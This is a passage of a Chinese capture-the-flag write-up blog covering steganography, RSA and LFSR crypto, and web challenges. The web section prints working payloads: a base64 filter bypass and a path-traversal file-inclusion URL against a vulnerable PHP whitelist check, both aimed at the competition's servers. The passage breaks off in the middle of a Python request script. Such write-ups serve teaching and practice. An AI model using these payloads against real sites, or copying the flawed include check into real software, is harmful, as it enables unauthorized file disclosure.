<p>扫条形码得到flag。</p>
<h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snow加密，将文件放入010editor看他的十六进制形式，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/2.png" alt="2"></p>
<p>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</p>
<h3 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h3><p>题目介绍：大家都用着我们的数字杭电（<a href="http://i.hdu.edu.cn/" target="_blank" rel="noopener">i.hdu.edu.cn</a>)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</p>
<p>flag形式为：flag{你找到的电子邮箱}</p>
<p>百度一个IP反查询工具，Whois查询，看看这个IP的备案，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/3.png" alt="3"></p>
<p>得到flag；</p>
<h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/4.png" alt="4"></p>
<p>第一张是可见的，应该没用，剩下来的，按顺序看。</p>
<p>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">2</span>abd<span class="number">3</span>fb<span class="number">9</span>d<span class="number">4</span><span class="keyword">c</span><span class="number">93</span>fb<span class="number">064</span>abf<span class="number">81</span>f<span class="number">5</span>fab<span class="number">84</span></span><br><span class="line">新手村钥匙</span><br></pre></td></tr></table></figure>

<p>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是outguess加密，</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r flag<span class="selector-class">.jpg</span> -t secret<span class="selector-class">.txt</span> -k d2abd3fb9d4c93fb064abf81f5fab84</span><br></pre></td></tr></table></figure>

<p>得到文件</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>cca<span class="number">6</span><span class="keyword">c</span><span class="number">50e48</span>e<span class="number">86</span><span class="keyword">c</span><span class="number">468</span>ee<span class="number">329</span>ddc<span class="number">11047</span></span><br><span class="line"></span><br><span class="line">最后一关大门的钥匙</span><br></pre></td></tr></table></figure>

<p>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</p>
<h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hint：PIL是个好东西</p>
<p>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/5.png" alt="5"></p>
<p>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，</p>
<p>构造脚本如下</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">"f1.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">"f2.png"</span>).convert(<span class="string">"L"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>=im.<span class="built_in">size</span>[<span class="number">0</span>]  #图片宽</span><br><span class="line"></span><br><span class="line"><span class="built_in">height</span>=im.<span class="built_in">size</span>[<span class="number">1</span>] #图片高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> x in range(<span class="number">0</span>,<span class="built_in">width</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">for</span> y in range(<span class="number">0</span>,<span class="built_in">height</span>):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">if</span>(data!=<span class="number">255</span> <span class="keyword">or</span> data2!=<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        	dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">for</span> i in range (<span class="keyword">int</span>(len(dd)/<span class="number">8</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = dd[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">word</span> = <span class="keyword">int</span>(<span class="keyword">word</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(<span class="keyword">int</span>(<span class="keyword">word</span>))</span><br><span class="line"></span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1)%<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= <span class="string">'='</span>*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">write</span>(flag)</span><br><span class="line"></span><br><span class="line">pic.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>

<p>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/6.png" alt="6"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件</p>
<p>openssl rsa -pubin -text -modulus -in public.pem</p>
<p>得到</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/7.png" alt="7"></p>
<p>其中。N=&gt;Modulus，e=&gt;Exponent</p>
<p>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，再用openssl解密flag.enc，得到字符串</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;Y!s04tEP&#123;ygraCl_f</span><br></pre></td></tr></table></figure>

<p>栅栏加方向即可得到flag，</p>
<p>rsatool和openssl的使用参考</p>
<p><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p>
<h3 id="川流不息"><a href="#川流不息" class="headerlink" title="川流不息"></a>川流不息</h3><p>题目加密脚本和密文</p>
<p>加密脚本</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> parameters import <span class="keyword">a</span></span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure>

<p>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">a</span>=[i,j,k,p,q]</span><br><span class="line">                        <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">                        <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">                            <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">                            <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">result</span>==key:</span><br><span class="line">                            print(<span class="keyword">a</span>)</span><br><span class="line">                            break</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">"flag&#123;"</span></span><br><span class="line">    plain = <span class="string">''</span>.join(bin(ord(i))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">    stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(plain))</span><br></pre></td></tr></table></figure>

<p>得到a=[1, 0, 0, 1, 0]</p>
<p>然后根据加密脚本，获得key。然后key与密文异或得到flag</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">a</span>=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    cipher = <span class="string">'111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(cipher))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>)),<span class="keyword">end</span>=<span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/8.png" alt="8"></p>
<p>输入</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//45.76.51.219:8050/?base=bXlmbGFn</span></span><br></pre></td></tr></table></figure>

<p>得到回显 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能输入bXlmbGFn！</span><br></pre></td></tr></table></figure>

<p>但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，</p>
<p>最终payload：</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//45.76.51.219:8050/?base=bXlmbGFn1</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>进入网站，f12，发现注释：</p>
<p>进入sorce.php发现源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞</p>
<p>审计代码得到：</p>
<p>要设定page的值，且内容要在whiteList中</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mb_substr</span><span class="params">(<span class="variable">$page</span>,<span class="number">0</span>,mb_strpos(<span class="variable">$page</span>.<span class="string">'?'</span>,<span class="string">'?'</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle</p>
<p>所以最终payload：</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">47.110</span><span class="number">.227</span><span class="number">.208</span>:<span class="number">8003</span>/index.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php?../../flag.php</span><br></pre></td></tr></table></figure>

<p>得到一个猜密码的界面    </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>猜密码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="xml">session_start();</span></span><br><span class="line"><span class="xml">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="xml">if (isset ($_POST['password'])) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'pwd'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>])</span></span><br><span class="line"><span class="xquery">                die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="xquery">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="xquery">                print <span class="string">'&lt;p&gt;猜测错误.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="xquery">                <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>]=time().time();</span></span><br><span class="line"><span class="xquery">        &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"猜密码"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#html解析器</span></span><br><span class="line">url=<span class="string">"http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"</span>    <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#获取一个session对象</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#返回的页面</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"pwd"</span>:<span class="string">"int(time.time())"</span>&#125;<span class="comment">#构建一个formData，用于传我们的</span></span><br><span class="line">re2=session.post(url,data=formData)<span 